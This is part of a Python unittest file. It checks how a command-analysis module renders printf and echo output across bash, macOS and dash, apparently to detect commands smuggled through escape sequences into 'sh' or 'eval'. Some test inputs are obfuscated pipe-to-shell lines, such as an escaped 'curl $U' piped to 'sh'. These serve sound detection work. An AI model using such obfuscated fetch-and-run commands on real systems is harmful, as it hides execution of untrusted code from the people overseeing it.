                ("a" + B + "cb%s", ["d"], "a\\cbd"), ("%*s|%-*s|", ["3", "a", "3", "b"], "  a|b  |"), ("%*s|", ["-3", "a"], "a  |"),
                ("%.2s|%.0s|%.s|%.9s|", ["abcd"] * 4, "ab|||abcd|"), ("%.*s|%.*s|", ["2", "abcd", "", "abcd"], "ab||"),
                ("%.*s|", ["-2", "abcd"], "abcd|"), ("%b|", ["a" + B + "cXY"], "a"),   # a negative one cuts nothing; `\c` ends it
                ("%6.2s|%-6.2s|", ["abcd", "abcd"], "    ab|ab    |"), ("%c%c|%3c|", ["ab", "cd", "ef"], "ac|  e|"),
                ("%d|%i|%d|%5d|", ["12", "-3", "x", "7"], "12|-3|0|    7|"), ("%5d|%-5d|%5i|", ["12", "-3", ""], "   12|-3   |    0|"),
                ("%05d|%-05d|%03i|%02u|", ["12", "12", "-7", "5"], "00012|12   |-07|05|"), ("%3c|%-3c|", ["ab", "cd"], "  a|c  |"),
                (B + "543" + B + "777|" + B + "400|", [], "c\xff||"), ("%b|%b|", [B + "543", B + "0543"], "c|c|"),   # a BYTE
                ("%s|%d|%05d|%b|", ["$A", "$B", "$C", "$D" + N], "$A|$B|$C|$D\n|"),          # a `$` word as it stands
                ("a%yb%s", ["x", "y"], "a"), ("%s|%y|%s", ["a", "b", "c"], "a|"), ("plain", ["x", "y"], "plain"),
                ("a%", ["x"], "a"), ("%5%|", [], ""), ("a%" + N + "b%s", ["c"], "a"), ("a" + B + "045b", [], "a%b"),
                ("%s%", ["a", "b"], "a"), ("%256s|", ["a"], " " * 255 + "a|"),      # the widest width followed
                ("%d|%d|", ["", "y"], "0|0|"),                                   # a word that begins no number
                ("%.300s|", ["a" * 280 + " b"], "a" * 280 + " b|"),              # a precision is never capped,
                ("%.999999999s|", ["abc"], "abc|"), ("a%*y|", ["3"], "a"),         # while it is an `int`
                # a digit outside ASCII is no digit to a shell: no width, no precision, no number
                ("a%" + chr(0x662) + "s|", ["x"], "a"), ("a%.1" + chr(0x662) + "s|", ["abc"], "a"), ("%d|", [chr(0x662)], "0|"),
                ("%s" + B + "0z", ["a"], "az")):
            for kinds in (self.BASH5, self.BASH3, self.MACOS, self.DASH):
                with self.subTest(fmt=fmt, words=words, letters=kinds["letters"]):
                    self.assertEqual(ascii(written), ascii(wp._formatted(fmt, words, kinds)))

    def test_a_format_each_family_prints_its_own_way(self):
        for fmt, words, bash5, bash3, dash in (
                (B + "x63" + B + "e|", [], "c\x1b|", "c\x1b|", B + "x63\x1b|"),
                (B + "E|", [], "\x1b|", "\x1b|", B + "E|"),
                (B + "u0063|" + B + "U00000063|", [], "c|c|", B + "u0063|" + B + "U00000063|", B + "u0063|" + B + "U00000063|"),
                ("a" + B + '"b' + B + "'c" + B + "?d", [], "a\"b'c?d", "a\"b'c?d", "a" + B + '"b' + B + "'c" + B + "?d"),
                ("%b|", [B + "x63" + B + '"' + B + "u0063"], "c" + B + '"c|', "c" + B + '"' + B + "u0063|", B + "x63" + B + '"' + B + "u0063|"),
                ("%q|%q|%q|", ["a b", "", "a=b:c/d.e+f@g%h-i_j,k"], "a\\ b|''|a=b:c/d.e+f@g%h-i_j\\,k|",
                 "a\\ b|''|a=b:c/d.e+f@g%h-i_j\\,k|", ""),
                ("%5q|%-5q|", ["", "a b"], "   ''|a\\ b |", "   ''|a\\ b |", ""),
                ("%q|%q|%q|", ["#a", "a#b", "$A"], "\\#a|a#b|$A|", "\\#a|a#b|$A|", ""),     # a `#` in front; a `$` word
                ("%Q|", ["a b"], "a\\ b|", "", ""),
                ("a%ls|%zd|", ["x", "1"], "ax|1|", "ax|1|", "a"),
                ("a" + B + "ud800b", [], "ab", "a" + B + "ud800b", "a" + B + "ud800b")):       # no text holds a lone surrogate
            for kinds, written in ((self.BASH5, bash5), (self.BASH3, bash3), (self.MACOS, bash3), (self.DASH, dash)):
                with self.subTest(fmt=fmt, words=words, letters=kinds["letters"], echo=kinds["echo"]):
                    self.assertEqual(ascii(written), ascii(wp._formatted(fmt, words, kinds)))

    def test_a_format_the_shells_print_their_own_ways_is_not_followed(self):
        # None: `_apart` answers LOUD. A text stands where a family does not know the letter and prints no more.
        E = chr(233)
        for fmt, words, bash5, bash3, dash in (
                ("%x|", ["255"], None, None, None), ("%o|", ["8"], None, None, None), ("%e|", ["1"], None, None, None),
                ("%.1f|", ["1"], None, None, None), ("%+d|", ["5"], None, None, None), ("% d|", ["5"], None, None, None),
                ("%'d|", ["5"], None, None, None), ("%#s|", ["a"], None, None, None), ("%05s|", ["a"], None, None, None),
                ("%.3d|", ["5"], None, None, None), ("%.2b|", ["abc"], None, None, None), ("%4b|", ["d"], None, None, None),
                ("%.b|", ["ab"], None, None, None), ("%.1c|", ["ab"], None, None, None), ("%3c|", [""], None, None, None),
                ("%.-1s|", ["ab"], None, None, None), ("%.03s|", ["abcd"], None, None, None),
                ("%*s|", ["010", "a"], None, None, None), ("%*s|", ["+3", "a"], None, None, None),
                ("%*s|", [" 4", "a"], None, None, None), ("%.*s|", ["x", "abcd"], None, None, None),
                ("%257s|", ["a"], None, None, None), ("%d|", ["0x10"], None, None, None), ("%d|", ["010"], None, None, None),
                ("%d|", ["12abc"], None, None, None), ("%d|", ["+5"], None, None, None), ("%d|", ["'A"], None, None, None),
                ("%d|", ["-0"], None, None, None), ("%d|", ["1234567890123456789"], None, None, None),
                ("%u|", ["-3"], None, None, None), ("%5s|", ["$A"], None, None, None), ("%.2s|", ["$A"], None, None, None),
                ("%c|", ["$A"], None, None, None), ("%-5d|", ["$A"], None, None, None), ("%*s|", ["$W", "a"], None, None, None),
                ("%-05d|", ["$A"], None, None, None),
                # past an `int` the shells print nothing or their own things, and bash 3.2 dies of a `*` word there:
                # before the letter is read, so no output "ends" at one it does not know
                ("%.9999999999s|", ["abc"], None, None, None), ("%.*s|", ["9999999999", "abc"], None, None, None),
                ("a%*y|", ["9999999999"], None, None, None), ("a%.*y|", ["x"], None, None, None),
                ("%5s|", [E], None, None, None), ("%.1s|", [E], None, None, None), ("%c|", [E], None, None, None),
                ("%d|", ["1" + chr(0x662)], None, None, None), ("%*s|", ["1" + chr(0x662), "a"], None, None, None),
                ("a%.2q|", ["abc"], None, None, "a"), ("a%q|", ["~x"], None, None, "a"), ("a%q|", ["x\ty"], None, None, "a"),
                ("a%nb", ["v"], None, None, "a"), ("a%(x y)T|", ["0"], None, "a", "a"), ("a%l(x)T|", ["0"], None, "a", "a"),
                ("a%.2Q|", ["a b"], None, "a", "a")):
            for kinds, written in ((self.BASH5, bash5), (self.BASH3, bash3), (self.MACOS, bash3), (self.DASH, dash)):
                with self.subTest(fmt=fmt, words=words, letters=kinds["letters"], echo=kinds["echo"]):
                    self.assertEqual(ascii(written), ascii(wp._formatted(fmt, words, kinds)))

    def test_a_width_no_shell_could_print_and_a_format_made_to_stall_the_scan(self):
        # A width past `_PAD`, or one of more digits than a machine word holds, is not followed: nothing is
        # allocated for it and no count of digits is a number Python refuses. The scan stays linear.
        for kinds in (self.BASH5, self.DASH):
            huge = "9" * 5000
            self.assertIsNone(wp._formatted("%" + huge + "s|%-" + huge + "s|", ["a", "b"], kinds))
            self.assertIsNone(wp._formatted("%*s|", [huge, "a"], kinds))
            self.assertIsNone(wp._formatted("%.*s|", [huge, "bcd"], kinds))
            self.assertIsNone(wp._formatted("%." + huge + "s|", ["abc"], kinds))
            self.assertEqual(None if kinds is self.BASH5 else "", wp._formatted("%(" * 50000 + "x", ["a"], kinds))
            self.assertEqual("x", wp._formatted("x" + "%5%" * 50000, [], kinds))

    def test_a_format_printed_again_is_followed_to_a_bound(self):
        # What is written bounds what is followed: `_LONG` characters, or four times the format and its words.
        for kinds in (self.BASH5, self.DASH):
            self.assertEqual(16000, len(wp._formatted("%s" + N, ["w"] * 8000, kinds)))      # 8,000 lines of one word
            self.assertEqual(6003, len(wp._formatted("x" * 2000 + "%s", ["a"] * 3, kinds)))  # three uses of 2,000
            self.assertIsNone(wp._formatted("x" * 2000 + "%s", ["a"] * 10, kinds))           # ten: 20,010 characters
            self.assertIsNone(wp._formatted("%256s" * 1000, ["a"], kinds))                   # 256,000 blanks of 5,000
            # ... and on the bound itself: eight uses of 512 characters are `_LONG`, and followed; of 513, not.
            self.assertEqual(wp._LONG, len(wp._formatted("x" * 511 + "%s", ["a"] * 8, kinds)))
            self.assertIsNone(wp._formatted("x" * 512 + "%s", ["a"] * 8, kinds))
            # ... and where four times what was written is the larger bound: 1,000 words of four characters
            # behind a format of five is 5,000 printed for 6,005 written.
            self.assertEqual(5000, len(wp._formatted("%s" + N, ["abcd"] * 1000, kinds)))
        words = shell_reader.command(shell_reader.statements("printf '" + "x" * 2000 + "%s' " + "'$A' " * 10)[0].stages[0].argv)
        self.assertEqual([wp._PAST_DEPTH[1]], wp._apart(words, None))                        # LOUD, said once
        self.assertEqual([wp._PAST_DEPTH[1]], wp._apart(words))

    def test_an_echo_under_each_row_and_family(self):
        bash, dash = wp._ECHO["bash"], wp._ECHO["sh"]
        for words, bash5, bash3, macos, sh in (
                (["a", "b"], "a b", "a b", "a b", "a b"), (["-n", "a"], "a", "a", "a", "a"),
                (["-e", "a" + N + "b"], "a\nb", "a\nb", "a\nb", "-e a\nb"), (["a" + N + "b"], "a" + N + "b", "a" + N + "b", "a" + N + "b", "a\nb"),
                (["-E", "a" + N + "b"], "a" + N + "b", "a" + N + "b", "a" + N + "b", "-E a\nb"),
                (["-ne", "a" + N], "a\n", "a\n", "a\n", "-ne a\n"), (["-e", "-n", "a"], "a", "a", "a", "-e -n a"),
                (["-n", "-e", "a" + N], "a\n", "a\n", "a\n", "-e a\n"), (["-nn", "a"], "a", "a", "a", "-nn a"),
                (["-n", "-n", "a"], "a", "a", "a", "-n a"),                         # dash takes ONE `-n`
                (["-eE", "a" + N], "a" + N, "a" + N, "a" + N, "-eE a\n"), (["-Ee", "a" + N], "a\n", "a\n", "a\n", "-Ee a\n"),
                (["-e", B + "0143" + B + "143"], "c" + B + "143", "c" + B + "143", "c" + B + "143", "-e cc"),
                (["-e", B + "0543" + B + "543"], "c" + B + "543", "c" + B + "543", "c" + B + "543", "-e cc"),     # a BYTE
                (["-e", B + "x63" + B + "e"], "c\x1b", "c\x1b", "c" + B + "e", "-e " + B + "x63\x1b"),
                (["-e", B + "u0063"], "c", B + "u0063", B + "u0063", "-e " + B + "u0063"),
                (["-e", "a" + B + "c", "b"], "a", "a", "a", "-e a"), (["-e", "a" + B + '"b'], "a" + B + '"b', "a" + B + '"b', "a" + B + '"b', "-e a" + B + '"b'),
                (["--", "a"], "-- a", "-- a", "-- a", "-- a"), (["-x", "a"], "-x a", "-x a", "-x a", "-x a"), ([], "", "", "", "")):
            for row, kinds, written in ((bash, self.BASH5, bash5), (bash, self.BASH3, bash3), (bash, self.MACOS, macos),
                                        (dash, self.DASH, sh)):
                with self.subTest(words=words, echo=kinds["echo"], letters=kinds["letters"]):
                    self.assertEqual(ascii(written), ascii(wp._echoed(words, row, kinds)))


class TestTheSecondWalkAlone(unittest.TestCase):
    """Both readings are the second walk's: nothing of them answers while the main pass runs."""

    @staticmethod
    def argv(line):
        return shell_reader.command(shell_reader.statements(line)[0].stages[0].argv)

    def test_the_texts_a_printer_adds_by_the_shell_that_runs_it(self):
        for line, bash, sh, any_ in (
                ("printf '%s" + N + "' '$X y' z", ["$X y\nz\n"], ["$X y\nz\n"], ["$X y\nz\n"]),
                ("printf -- '%s" + N + "' '$X'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("/usr/bin/printf '%s" + N + "' '$X'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("printf '$X'", [], [], []),                    # the format alone: `main`'s one text is this one
                ("printf '$X" + N + "'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("printf -v out '%s' '$X'", [], [], []),        # an option in the format's place: nothing printed
                ("printf -- -v '$X'", ["-v"], ["-v"], ["-v"]),  # after `--` it IS the format
                ('printf "$F" "$X y" z', ["$F", "$X y", "z"], ["$F", "$X y", "z"], ["$F", "$X y", "z"]),   # a `$` format
                ("printf '" + B + "x63%s' '$X'", ["c$X"], [B + "x63$X"], ["c$X", B + "x63$X"]),
                ("printf '" + B + "u0063%s' '$X'", ["c$X", B + "u0063$X"], [B + "u0063$X"], ["c$X", B + "u0063$X"]),
                ("printf", [], [], []),
                ("echo '$X' y", [], [], []),                    # `echo`'s one text is its line
                ("echo -n '$X' y", ["$X y"], ["$X y"], ["$X y"]),
                ("echo -ne -E '$X'", ["$X"], [], ["$X"]),      # dash takes ONE `-n`: its text is `main`'s
                ("echo -n -e '$X'", ["$X"], ["-e $X"], ["$X", "-e $X"]),
                ("echo -n -n '$X'", ["$X"], ["-n $X"], ["$X", "-n $X"]),
                ("echo -e '$X" + N + "y'", ["$X\ny"], ["-e $X\ny"], ["$X\ny", "-e $X\ny"]),
                ("echo '$X" + N + "y'", [], ["$X\ny"], ["$X\ny"]),
                ("echo -e '$X" + B + "e'", ["$X\x1b", "$X" + B + "e"], ["-e $X\x1b"], ["$X\x1b", "$X" + B + "e", "-e $X\x1b"]),
                ("echo", [], [], [])):
            words = self.argv(line)
            with self.subTest(line=line):
                self.assertEqual((bash, bash, sh, sh, any_, any_),
                                 (wp._apart(words, None), wp._apart(words, "bash {0}"), wp._apart(words, "sh"),
                                  wp._apart(words, "dash"), wp._apart(words), wp._apart(words, "ksh")))
            with self.subTest(line=line, main_pass=True), wo.mains_answer():
                self.assertEqual([], wp._apart(words, None) + wp._apart(words))

    def test_a_printer_is_weighed_once_a_DISTINCT_text(self):
        def texts(script, shell):
            stages = shell_reader.statements(script)[0].stages
            return wp.unspelled(stages[-1], stages[:-1], shell)[1:]

        # Every family's text differs here: bash 5.2 decodes `\u`, `\x` and `\e`, bash 3.2 not `\u`, macOS's 3.2
        # not `\e` either; dash prints the `-e` and decodes `\e` alone. `main`'s one text, then one a family.
        differ = 'echo -e "' + B + "u0063" + B + "x75rl" + B + 'e $U" | sh'
        self.assertEqual(4, len(texts(differ, None)))               # a bash setting: three families
        self.assertEqual(2, len(texts(differ, "sh")))               # a dash setting: one
        self.assertEqual(5, len(texts(differ, wp.ANY)))             # an unmeasured runner: all four
        # Where the families print alike, their one text is weighed once beside `main`'s.
        alike = "printf '%s %s" + N + "' a \"$U\" | sh"
        self.assertEqual([2, 2, 2], [len(texts(alike, shell)) for shell in (None, "sh", wp.ANY)])
        with wo.mains_answer():                                     # the main pass: `main`'s one text alone
            self.assertEqual([1, 1], [len(texts(differ, wp.ANY)), len(texts(alike, None))])

    def test_a_stage_that_rewrites_the_text_is_handed_what_the_printer_writes_too(self):
        def handed(script):
            stages = shell_reader.statements(script)[0].stages
            return wp.unspelled(stages[-1], stages[:-1])

        self.assertEqual(["tr", "%s %s" + N + " a $X", "a $X\n", "a b"], handed("printf '%s %s" + N + "' a \"$X\" | tr a b | sh"))
        self.assertEqual(["tr", "$X", "a b"], handed('echo "$X" | tr a b | sh'))             # an `echo`'s is its line
        self.assertEqual(["tr", "x\n", "a b"], handed("echo x | tr a b | sh"))               # spelled: nothing added
        self.assertEqual(["tr", "x\n", "a b"], handed("printf 'x" + N + "' | tr a b | sh"))   # ... nor to a `printf`
        with wo.mains_answer():
            self.assertEqual(["tr", "%s %s" + N + " a $X", "a b"], handed("printf '%s %s" + N + "' a \"$X\" | tr a b | sh"))

    def test_a_word_the_reader_spelled_is_read_as_spelled(self):
        class Spelled(str):
            spelled = "curl"

        words = self.argv("printf '%s -o t %s" + N + "' x '$U'")
        self.assertEqual(["x -o t $U\n"], wp._apart(words, None))
        self.assertEqual(["curl -o t $U\n"], wp._apart(words[:2] + [Spelled("$C")] + words[3:], None))

    def test_a_lifted_substitution_is_a_dollar_word_to_the_rendering(self):
        # The reader lifts a `$(...)` out of its word: the word holds no `$`, and the shell fills it all the same.
        # So it stands as it is under `%s`, `%q` and `%d`, and a width or a `%c` on it is not followed.
        words = self.argv("printf '%s|%q|%d" + N + "' \"$(a)\" \"$(b)\" \"$(c)\"")
        self.assertEqual(["%s|%s|%s\n" % tuple(words[2:])], wp._apart(words, None))
        for fmt in ("%5s", "%c", "%.2s"):
            with self.subTest(fmt=fmt):
                self.assertEqual([wp._PAST_DEPTH[1]], wp._apart(self.argv("printf '" + fmt + N + "' \"$(a)\""), None))

    def test_zsh_has_a_row_of_its_own_and_every_familys_escapes(self):
        # `_ECHO` has zsh's options and its decoding; no `_WRITERS` row is measured for it, so all four read.
        self.assertEqual(["$X"], wp._apart(self.argv("echo -n -e '$X'"), "zsh"))
        self.assertEqual(["$Xc"], wp._apart(self.argv("echo '$X" + B + "x63'"), "zsh"))     # dash's text is `main`'s
        self.assertEqual(["c$X", B + "x63$X"], wp._apart(self.argv("printf '" + B + "x63%s' '$X'"), "zsh"))

    def test_the_one_printer_a_program_word_is(self):
        def word(line):
            return self.argv(line)[-1]

        self.assertEqual(["$X y"], wp.worded(word('eval "$(echo \'$X y\')"')))
        self.assertEqual(["%s\\n $X", "$X\n"], wp.worded(word('sh -c "$(printf \'%s\\n\' \'$X\')"')))
        self.assertEqual(["-n $X", "$X"], wp.worded(word('eval "$(echo -n \'$X\')"')))
        self.assertEqual([], wp.worded(word('eval "$(echo plain)"')))                  # spelled: read as the program
        self.assertEqual([], wp.worded(word('eval "$(echo \'$X\'; true)"')))           # not one printer
        self.assertEqual([], wp.worded(word('eval "x $(echo \'$X\')"')))               # not ALL one `$(...)`
        self.assertEqual([], wp.worded(word("sh <(echo '$X')")))                        # a file, `unprinted`'s
        self.assertEqual([], wp.worded("$X"))
        with wo.mains_answer():
            self.assertEqual([], wp.worded(word('eval "$(echo \'$X y\')"')))


if __name__ == "__main__":
    unittest.main()
